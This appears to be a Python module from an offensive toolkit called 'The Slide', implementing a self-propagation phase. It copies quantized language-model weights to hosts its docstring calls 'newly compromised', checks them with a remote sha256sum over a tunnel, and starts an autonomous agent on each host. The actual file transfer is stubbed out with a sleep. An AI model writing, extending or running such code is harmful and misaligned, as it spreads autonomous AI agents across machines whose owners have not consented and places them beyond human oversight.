# sovereign_movement/slide/model_propagation.py
"""
ModelPropagation — Phase 4 of The Slide (Ingest / Self-Propagation)

Handles turning newly compromised hosts into full reasoning nodes by:
- Transferring quantized model weights with real integrity verification
- Activating a new SlideAgent instance on the remote host

Uses the existing SovereignTunnel for secure transfer and remote execution.
"""

from __future__ import annotations
from typing import Optional
import hashlib
import logging
import os
import time

from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel
from sovereign_engine.frame_energy import FrameEnergy

logger = logging.getLogger("sovereign.slide.model_propagation")


class ModelPropagation:
    """
    Sovereign model and agent propagation engine.

    Phase 4 (Ingest) of The Slide.
    """

    def __init__(
        self,
        tunnel_manager: SovereignTunnel,
        frame_energy: Optional[FrameEnergy] = None,
        model_path: str = "models/quantized/",
        default_model: str = "qwen2.5-coder-32b-q4_k_m.gguf",
    ):
        self.tunnel_manager = tunnel_manager
        self.frame_energy = frame_energy
        self.model_path = model_path
        self.default_model = default_model

    # ============================================================
    # Main Public Method
    # ============================================================
    def propagate_to_host(
        self,
        target_host: str,
        tunnel_id: str,
        activate_agent: bool = True,
        transfer_model: bool = True,
    ) -> bool:
        logger.info(f"[Phase 4] Starting ingestion on {target_host}")

        success = True

        if transfer_model:
            if not self._transfer_model_weights(target_host, tunnel_id):
                logger.error(f"[Phase 4] Model transfer to {target_host} failed")
                success = False

        if activate_agent and success:
            if not self._activate_remote_slide_agent(target_host, tunnel_id):
                logger.error(f"[Phase 4] Failed to activate SlideAgent on {target_host}")
                success = False

        if success:
            logger.info(f"[Phase 4] Successfully ingested {target_host}")
        else:
            logger.warning(f"[Phase 4] Partial failure ingesting {target_host}")

        return success

    # ============================================================
    # Model Transfer with Real Integrity Verification
    # ============================================================

    def _transfer_model_weights(self, target_host: str, tunnel_id: str) -> bool:
        model_file = os.path.join(self.model_path, self.default_model)

        if not os.path.exists(model_file):
            logger.error(f"[Phase 4] Model file not found: {model_file}")
            return False

        # Step 1: Compute local hash
        local_hash = self._compute_file_hash(model_file)
        if not local_hash:
            logger.error("[Phase 4] Failed to compute local model hash")
            return False

        logger.debug(f"[Phase 4] Local model SHA-256: {local_hash}")

        # TODO: Implement actual file transfer using SovereignTunnel
        # Example:
        # remote_path = f"/tmp/slide_{self.default_model}"
        # if not self.tunnel_manager.send_file(tunnel_id, model_file, remote_path):
        #     return False

        time.sleep(0.8)  # Placeholder for actual transfer

        # Step 2: Real remote hash verification via tunnel
        remote_hash = self._verify_remote_file_hash(tunnel_id, self.default_model)
        if not remote_hash:
            logger.error("[Phase 4] Failed to retrieve remote model hash")
            return False

        if remote_hash != local_hash:
            logger.error(
                f"[Phase 4] Integrity verification FAILED on {target_host}\n"
                f"Local : {local_hash}\n"
                f"Remote: {remote_hash}"
            )
            return False

        logger.info(f"[Phase 4] Model integrity successfully verified on {target_host}")
        return True

    def _compute_file_hash(self, file_path: str) -> Optional[str]:
        """Compute SHA-256 hash of a local file."""
        try:
            sha256 = hashlib.sha256()
            with open(file_path, "rb") as f:
                for chunk in iter(lambda: f.read(8192), b""):
                    sha256.update(chunk)
            return sha256.hexdigest()
        except Exception as e:
            logger.error(f"[Phase 4] Local hash computation failed: {e}")
            return None

    def _verify_remote_file_hash(self, tunnel_id: str, model_filename: str) -> Optional[str]:
        """
        Execute sha256sum on the remote host via the existing SovereignTunnel.
        """
        remote_path = f"/tmp/slide_{model_filename}"
        command = f"sha256sum {remote_path} 2>/dev/null | awk '{{print $1}}'"

        try:
            # This assumes SovereignTunnel has an execute_command method
            # that returns an object with .stdout and .success attributes.
            result = self.tunnel_manager.execute_command(tunnel_id, command)

            if not result or not getattr(result, "success", False):
                logger.error(f"[Phase 4] Failed to execute remote hash command on tunnel {tunnel_id}")
                return None

            remote_hash = result.stdout.strip()
            if not remote_hash:
                logger.error("[Phase 4] Remote hash command returned empty output")
                return None

            return remote_hash

        except AttributeError:
            logger.error(
                "[Phase 4] SovereignTunnel does not have execute_command() method. "
                "Please implement it to support remote verification."
            )
            return None
        except Exception as e:
            logger.error(f"[Phase 4] Remote hash verification failed: {e}")
            return None

    # ============================================================
    # Remote Agent Activation
    # ============================================================

    def _activate_remote_slide_agent(self, target_host: str, tunnel_id: str) -> bool:
        logger.debug(f"[Phase 4] Activating remote SlideAgent on {target_host}")

        try:
            activation_command = (
                "python3 -m sovereign_movement.slide.slide_agent "
                f"--host {target_host} --mode autonomous"
            )

            # Execute activation command via tunnel
            result = self.tunnel_manager.execute_command(tunnel_id, activation_command)

            if result and getattr(result, "success", False):
                logger.info(f"[Phase 4] SlideAgent successfully activated on {target_host}")
                return True
            else:
                logger.warning(f"[Phase 4] Activation command may have failed on {target_host}")
                return False

        except Exception as e:
            logger.error(f"[Phase 4] Remote activation failed: {e}")
            return False

    # ============================================================
    # Rust Path Hook
    # ============================================================
    def propagate_via_rust(self, target_host: str, tunnel_id: str) -> bool:
        """Hook for future Rust-native implementation."""
        logger.debug("[Phase 4] Rust propagation path called (placeholder)")
        return self.propagate_to_host(target_host, tunnel_id)